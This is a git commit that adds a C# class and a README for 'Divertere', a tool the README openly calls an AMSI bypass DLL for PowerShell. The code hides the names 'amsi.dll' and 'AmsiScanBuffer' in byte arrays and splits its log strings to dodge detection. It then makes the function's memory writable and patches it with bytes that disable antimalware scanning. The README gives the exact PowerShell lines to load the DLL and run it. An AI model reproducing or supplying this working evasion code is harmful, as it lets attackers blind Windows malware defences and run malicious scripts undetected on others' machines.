96fe677c7a39f4400c16ba5e5e2759d79db04853
kenfinger <122631640+kenfinger@users.noreply.github.com>
2023-01-15 10:35:17 -0600

    Add files via upload

---
+++ Class1.cs
@@ -0,0 +1,80 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Runtime.InteropServices;
+
+public class Tinctura
+{
+    static byte[] DeeElEl = new byte[] { 0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c };
+    static byte[] ScnBuffr = new byte[] { 0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72 };
+
+    public static void Process()
+    {
+        try
+        {
+            Console.WriteLine(" ");
+            Console.WriteLine("[x] At" + "tempt" + "ing " + "pa" + "tch...");
+            Console.WriteLine(" ");
+
+            // Load amsi.dll and get location of AmsiScanBuffer
+            IntPtr lib = Win32.LoadLibrary(System.Text.Encoding.UTF8.GetString(DeeElEl, 0, DeeElEl.Length));
+            IntPtr scanProc = Win32.GetProcAddress(lib, System.Text.Encoding.UTF8.GetString(ScnBuffr, 0, ScnBuffr.Length));
+
+            var patchBytes = GetBytes;
+
+            // Set region to RWX
+            Win32.VirtualProtect(scanProc, (UIntPtr)patchBytes.Length, 0x40, out uint oldProtect);
+
+            // Copy patch
+            Marshal.Copy(patchBytes, 0, scanProc, patchBytes.Length);
+
+            // Restore region to RX
+            Win32.VirtualProtect(scanProc, (UIntPtr)patchBytes.Length, oldProtect, out uint del);
+
+            Console.WriteLine(" ");
+            Console.WriteLine("[x] Pat" + "ch" + " completed...");
+            Console.WriteLine(" ");
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine(" [x] {0}", e.Message);
+            Console.WriteLine(" [x] {0}", e.InnerException);
+        }
+    }
+
+    static byte[] GetBytes
+    {
+        get
+        {
+            if (Is64Bit)
+            {
+                return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            }
+
+            return new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+        }
+    }
+
+    static bool Is64Bit
+    {
+        get
+        {
+            return IntPtr.Size == 8;
+        }
+    }
+}
+
+class Win32
+{
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+
---
+++ ReadMe.md
@@ -0,0 +1,87 @@
+<!-- PROJECT SHIELDS -->
+[![Build Status][build-shield]]()
+[![Contributors][contributors-shield]]()
+[![MIT License][license-shield]][license-url]
+
+
+<!-- PROJECT LOGO -->
+<br />
+<p align="center">
+  <a href="https://github.com/kenfinger/Divertere">
+    <img src="logo.png" alt="Logo" width="80" height="80">
+  </a>
+
+  <h3 align="center">Divertere</h3>
+
+  <p align="center">
+    An AMSI Bypass DLL
+    <br />
+    <br />
+    ·
+    <a href="https://github.com/kenfinger/Divertere/issues">Report Bug</a>
+    ·
+    <a href="https://github.com/kenfinger/Divertere/issues">Request Feature</a>
+  </p>
+</p>
+
+
+
+<!-- ABOUT THE PROJECT -->
+## About The Project
+
+[![Product Name Screen Shot][product-screenshot]]
+
+An AMSI bypass DLL for use in PowerShell. 
+
+
+<!-- USAGE EXAMPLES -->
+## Usage
+
+> [System.Reflection.Assembly]::LoadFile("C:\<DLL_Directory>\Divertere.dll")
+> [Tinctura]::Process()
+
+
+
+<!-- CONTRIBUTING -->
+## Contributing
+
+Contributions are what make the open source community such an amazing place to be learn, inspire, and create. Any contributions you make are **greatly appreciated**.
+
+1. Fork the Project
+2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
+3. Commit your Changes (`git commit -m 'Add some AmazingFeature`)
+4. Push to the Branch (`git push origin feature/AmazingFeature`)
+5. Open a Pull Request
+
+
+
+<!-- LICENSE -->
+## License
+
+Distributed under the MIT License. See `LICENSE` for more information.
+
+
+
+<!-- CONTACT -->
+## Contact
+
+Kerry Enfinger - k.enfinger@proton.me
+
+Project Link: [https://github.com/kenfinger/Divertere](https://github.com/kenfinger/Divertere)
+
+
+
+<!-- ACKNOWLEDGEMENTS -->
+## Acknowledgements
+* [Damien Cauquil](https://digital.security)
+* [Slawomir Jasek](https://smartlockpicking.com)
+
+
+
+
+<!-- MARKDOWN LINKS & IMAGES -->
+[build-shield]: https://img.shields.io/badge/build-passing-brightgreen.svg?style=flat-square
+[contributors-shield]: https://img.shields.io/badge/contributors-1-orange.svg?style=flat-square
+[license-shield]: https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square
+[license-url]: https://choosealicense.com/licenses/mit
+[product-screenshot]: https://raw.githubusercontent.com/kenfinger/Divertere/main/screenshot.png
